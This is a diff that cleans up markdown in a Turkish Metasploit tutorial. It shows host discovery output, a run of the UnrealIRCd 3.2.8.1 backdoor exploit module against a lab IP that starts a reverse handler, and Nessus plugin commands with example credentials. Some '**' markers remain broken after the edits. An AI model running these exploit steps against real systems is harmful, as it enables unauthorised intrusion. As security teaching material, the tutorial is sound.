@@ -72,10 +72,10 @@ address         mac  name    os_name                                            
 172.16.194.1                 one of these operating systems :  Mac OS X 10.5 Mac OS X 10.6 Mac OS X 10.7                       device         
 172.16.194.2                 Unknown                                                                                               device         
 172.16.194.134               Microsoft Windows                                                                   XP         SP2    client         
-172.16.194.148               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**                                                              device         
+172.16.194.148               Linux Kernel 2.6 on Ubuntu 8.04 (hardy)                                                              device         
 172.16.194.163               Linux Kernel 3.2.6 on Ubuntu 10.04                                                                   device         
 172.16.194.165       phpcgi  Linux phpcgi 2.6.32-38-generic-pae #83-Ubuntu SMP Wed Jan 4 12:11:13 UTC 2012 i686                    device         
-172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**                                                              device                                                                                                                                          
+172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 (hardy)                                                              device                                                                                                                                          
 
 msf >
 ```
@@ -144,7 +144,7 @@ host            port   proto  name            state  info
 
 ```bash
 msf > help vulns
-Print all vulnerabilities **in **the database
+Print all vulnerabilities **in the database
 
 Usage: vulns **[**addr range]
 
@@ -228,7 +228,7 @@ Arama sonucunda, `exploit/unix/irc/unreal_ircd_3281_backdoor` isimli bir exploit
 ```bash
 msf  use exploit/unix/irc/unreal_ircd_3281_backdoor
 
-msf  exploit**(**unreal_ircd_3281_backdoor**)** > exploit
+msf  exploit(unreal_ircd_3281_backdoor) > exploit
 
 > Started reverse double handler
 > Connected to 172.16.194.172:6667...
@@ -294,8 +294,8 @@ Exploit modülünün kullanımı ile Hedef IP adresinde bir komut satırı açı
 
 ```bash
 msf > load nessus
-> Nessus Bridge **for **Metasploit 1.1
-**[**+] Type nessus_help **for **a command listing
+> Nessus Bridge for **Metasploit 1.1
+**[**+] Type nessus_help for **a command listing
 > Successfully loaded plugin: nessus
 ```
 
@@ -307,7 +307,7 @@ Bu eklentinin bize sunduğu komutları görmek için, `nessus_help` yardım komu
 ```bash
 msf > nessus_help
 **[**+] Nessus Help
-**[**+] type nessus_help command **for **help with specific commands
+**[**+] type nessus_help command for **help with specific commands
 
 Command                    Help Text
 -------                    ---------
@@ -347,7 +347,7 @@ nessus_scan_status         List all currently running Nessus scans
 
 ```bash
 msf > nessus_connect dook:s3cr3t@192.168.1.100
-**[**-] Warning: SSL connections are not verified **in **this release, it is possible **for **an attacker
+**[**-] Warning: SSL connections are not verified **in **this release, it is possible for **an attacker
 **[**-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
 **[**-]          credentials. If you are running this on a trusted network, please pass **in** 'ok'
 **[**-]          as an additional parameter to this command.
@@ -424,7 +424,7 @@ msf > nessus_scan_status
 > No Scans Running.
 > You can:
 >         List of completed scans:         nessus_report_list
->         Create a scan:                   nessus_scan_new policy id scan name target**(**s**)**
+>         Create a scan:                   nessus_scan_new policy id scan name target(s)
 msf >
 ```
 
@@ -452,7 +452,7 @@ ID                                                    Name    Status     Date
 msf > nessus_report_get
 > Usage:
 >        nessus_report_get report id
->        use nessus_report_list to list all available reports **for **importing
+>        use nessus_report_list to list all available reports for **importing
 
 
 msf > nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
